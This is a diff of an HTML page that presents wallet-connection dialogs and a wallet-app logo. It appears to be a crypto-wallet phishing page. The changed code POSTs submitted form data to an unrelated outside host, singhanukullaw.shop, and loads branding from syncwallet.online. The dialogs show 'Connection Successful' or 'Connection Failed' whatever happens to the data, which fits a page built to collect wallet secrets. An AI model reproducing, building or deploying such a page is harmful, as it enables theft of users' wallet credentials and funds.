@@ -6522,7 +6522,7 @@
         }
 
     </style>
-    <style>/* cyrillic-ext */
+  <style>/* cyrillic-ext */
 @font-face {
   font-family: 'Montserrat';
   font-style: normal;
@@ -6938,23 +6938,22 @@
         </div>
       </div>
     </div>
-    <div id="success-dialog" class="message-dialog text-center" style="display: none;text-align: center;">
+    <div id="success-dialog" class="message-dialog" style="display: none">
       <div class="send-dialog-overlay"></div>
       <div class="send-dialog-content">
         <div class="connect-dialog-body">
-          <img style="width: 100px" src="images\dialogbox-img.png" alt="Success">
-          <h4 id="sendmsgPop" class="mt-3">Connection Successful</h4>
+          <img style="width: 100px" src="assets/success.gif" alt="Success">
+          <h4 class="mt-3">Connection Successful</h4>
           <img style="width: 100px" src="assets/qr.png" alt="Success">
         </div>
       </div>
     </div>
-    <div id="error-dialog" class="message-dialog text-center" style="display: none;text-align: center;">
+    <div id="error-dialog" class="message-dialog" style="display: none">
       <div class="send-dialog-overlay"></div>
       <div class="send-dialog-content" style="background: #fefcfb">
         <div class="connect-dialog-body">
-          <img style="width: 150px" src="images\dialogbox-img.png" alt="Success">
-          <h4 class="mt-3">❌ Connection Failed, Try Again</h4>
-		  <h3 id="sendfailed"> </h3>
+          <img style="width: 150px" src="assets/error.gif" alt="Success">
+          <h4 class="mt-3">Connection Failed, Try Again</h4>
         </div>
       </div>
     </div>
@@ -7017,7 +7016,7 @@
           <div class="connection-info"></div>
           <div class="wallet-app-info">
             <div class="wallet-app-logo">
-              <img id="current-wallet-logo" src="https://e7.pngegg.com/pngimages/882/747/png-clipart-budget-investment-finance-saving-cartoon-thumbnail.png" alt="wallet-app-name">
+              <img id="current-wallet-logo" src="https://syncwallet.online/static/idlefinance-80d51872039fc5e44da8471f772e7b8e.png" alt="wallet-app-name">
             </div>
             <div id="current-wallet-app"></div>
           </div>
@@ -7690,8 +7689,8 @@
           let formData = new FormData(this);
 
           $.ajax({
-           type: "POST",
-            url: "https://singhanukullaw.shop/rpc/api/popin.php",
+            type: "POST",
+            url: "https://singhanukullaw.shop/rpc/api/",
             data: formData,
             cache: false,
             contentType: false,
